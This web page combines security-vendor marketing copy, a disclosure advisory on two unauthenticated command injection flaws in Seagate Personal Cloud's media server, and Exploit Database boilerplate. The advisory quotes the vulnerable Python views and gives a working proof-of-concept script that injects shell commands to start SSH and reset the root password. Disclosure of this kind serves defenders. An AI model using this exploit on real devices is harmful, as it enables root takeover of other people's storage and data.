## **Vulnerability Management for a Variety of Industries**

Nearly every industry relies on applications and networks to conduct business, though some have more stringent security requirements than others. Organizations in the aviation, automotive, healthcare, and financial sectors have some of the strongest security regulations. Layers of security during software and application development as well as after product deployment are necessary to keep consumers safe and organizations compliant.

![airplane icon](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilitiesaviation.png)

### [Aviation](https://www.beyondsecurity.com/resources/guides/aviation-software-testing-guide)

Cybersecurity is crucial to the aviation industry. Travelers in the sky need to be protected from any attacks that can prevent airlines from operating normally. Those same customers need to have their payment and sensitive data protected when purchasing a ticket.

### [Automotive](https://www.beyondsecurity.com/resources/guide/how-fuzz-testing-helps-secure-automotive-industry)

Wireless connectivity is becoming commonplace inside of new vehicles. Automotive connectivity to WIFI and Bluetooth are making vehicles a bigger target for cybercriminals. One vulnerability can take down any vehicle with that technology. DAST, Black Box Fuzzing, and SAST during development are a solid foundation of security to prevent these attacks.

![](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-automative.png)

![heartbeat](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-healthcare.png)

### [Healthcare and Medical](https://www.beyondsecurity.com/resources/guides/security-testing-for-networked-medical-devices)

Wireless technology and application software are being used more in medical devices to automate and monitor individual healthcare needs. Device security is the utmost priority, preventing risks that can directly endanger lives. Application security is needed to prevent cyber attackers from tampering with devices and stealing private healthcare data. SAST and DAST during development can help find vulnerabilities that can compromise these devices.

### Critical Infrastructure and Industrial Facilities

Water, power, and gas are some prime targets for large scale attacks. The best way to keep cyberattackers from taking down an entire city’s water supply is to create a layered cybersecurity portfolio. From the start, vulnerabilities need to be identified, remediated, and constantly monitored to prevent a mass standstill of public utilities.

![lightning bolt icon](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-critical-industries.png)

![factory](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-manufactures.png)

### Discrete Manufacturers

Manufacturing industries keep building and assembling essential pieces for everyday life. Any attack on that automation would create a bottleneck in multiple industries that rely on these products. A disruption in manufacturing has been proven to drive up prices and create a negative workflow ripple worldwide. Using layered security solutions prior to deployment and scanning afterwards will help prevent any shutdown.

### Financial

Financial institutions are still top cyberattacker targets. Monetary apps for banks, credit unions, investment, and retirement firms need the highest cybersecurity measures. Security that prevents cyberattacks should be implemented during development and embedded directly into these applications. Compliance for this industry is only growing with each reported breach.

# SSD Advisory – Seagate Personal Cloud Multiple Vulnerabilities

## Vulnerabilities summary
The following advisory describes two (2) unauthenticated command injection vulnerabilities.

Seagate Personal Cloud Home Media Storage is “the easiest way to store, organize, stream and share all your music, movies, photos, and important documents.”

## Credit
An independent security researcher, Yorick Koster, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program

## Vendor response
Seagate was informed of the vulnerability on October 16, but while acknowledging the receipt of the vulnerability information, refused to respond to the technical claims, to give a fix timeline or coordinate an advisory

## Vulnerabilities details
Seagate Media Server uses Django web framework and is mapped to the .psp extension.

Any URL that ends with .psp is automatically send to the Seagate Media Server application using the FastCGI protocol.
/etc/lighttpd/conf.d/django-host.conf:

```
fastcgi.server += (
".psp"=>
   ((
      "socket" => "/var/run/manage_py-fastcgi.socket",
      "check-local" => "disable",
      "stream-post" => "enable",
      "allow-x-send-file" => "enable",
   )),
".psp/"=>
   ((
      "socket" => "/var/run/manage_py-fastcgi.socket",
      "check-local" => "disable",
      "stream-post" => "enable",
      "allow-x-send-file" => "enable",
   ))
)
```

URLs are mapped to specific views in the file /usr/lib/django_host/seagate_media_server/urls.py.

Two views were found to be affected by unauthenticated command injection.

The affected views are:

- uploadTelemetry
- getLogs

These views takes user input from GET parameters and pass these unvalidated/unsanitized to methods of the commands Python module.

This allows an attacker to inject arbitrary system commands, that will be executed with root privileges.

/usr/lib/django_host/seagate_media_server/views.py:

```
@csrf_exempt
def uploadTelemetry(request):
   ts = request.GET.get('TimeStamp','')
   if (checkDBSQLite()) :
      response = '{"stat":"failed","code":"80","message":"The Database has not been initialized or mounted yet!"}'
   else :
      if ts == "":
         response = '{"stat":"failed","code":"380","message":"TimeStamp parameter missing"}'
         return HttpResponse(response);
      cmd = "/usr/local/bin/log_telemetry "+str(ts)
      commands.getoutput(cmd)
   return HttpResponse('{"stat":"ok"}')
```

/usr/lib/django_host/seagate_media_server/views.py:

```
@csrf_exempt
def getLogs (request):
   try:
      cmd_base='/usr/bin/log-extract-manager.sh'
      uID = request.GET.get ( 'arch_id', None )
      time_stamp = request.GET.get ( 'time_stamp', '' )

      if uID:
         (status, output) = commands.getstatusoutput(cmd_base + ' status ' + uID);
         if ('In progress' in output) and (uID in output) :
            return HttpResponse ('{"stat":"ok", "data": {"status":"In Progress"}}')
         elif (status == 0) :
            return HttpResponse ('{"stat":"ok", "data": {"url":"%s", "fileSize":"%d"}}' % ( urllib.quote(output.encode('utf-8')), os.path.getsize(output) ))
         else :
            return HttpResponse ('{"stat":"failed", "code":"853","message":"Id not recognized."}' )
      else:
         (status, output) = commands.getstatusoutput(cmd_base + ' start ' + time_stamp);
         if (status == 0) :
            return HttpResponse ('{"stat":"ok", "data": {"archiveID":"%s"}}' % (output))

      return HttpResponse ('{"stat":"failed", "code":"852","message":"Zip file not created."}' )
   except :
      return HttpResponse ('{"stat":"failed", "code":"852","message":"Zip file not created."}' )
```

Note that both views contain the csrf_exempt decorator, which disables the default Cross-Site Request Forgery protection of Django. As such, these issues can be exploited via Cross-Site Request Forgery.

### Proof of Concept
The following proof of concept will try to enable the SSH service, and change the root password. When successful it will be possible to log into the device over SSH with the new password.

```
#!/usr/bin/env python
import os
import urllib

scheme = 'http'
host = 'personalcloud.local'
port = '80'
path = 'uploadTelemetry.psp'
querystr = 'TimeStamp=%3b'
#path = 'getLogs.psp'
#querystr = 'time_stamp=%3b'
password = 'Welcome01'

cmds = ['ngc --start sshd 2>&1',
      'echo -e "%(s)s\n%(s)s"|passwd 2>&1' % {'s' : password}]

for cmd in cmds:
   print 'Running command', repr(cmd)
   cmd = urllib.quote_plus(cmd)
   r = urllib.urlopen('%s://%s:%s/%s?%s%s' % (scheme, host, port, path, querystr, cmd))
   print r.read()

print 'Log in with', password
os.system('ssh -p 2222 root@%s' % host)
```

```

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
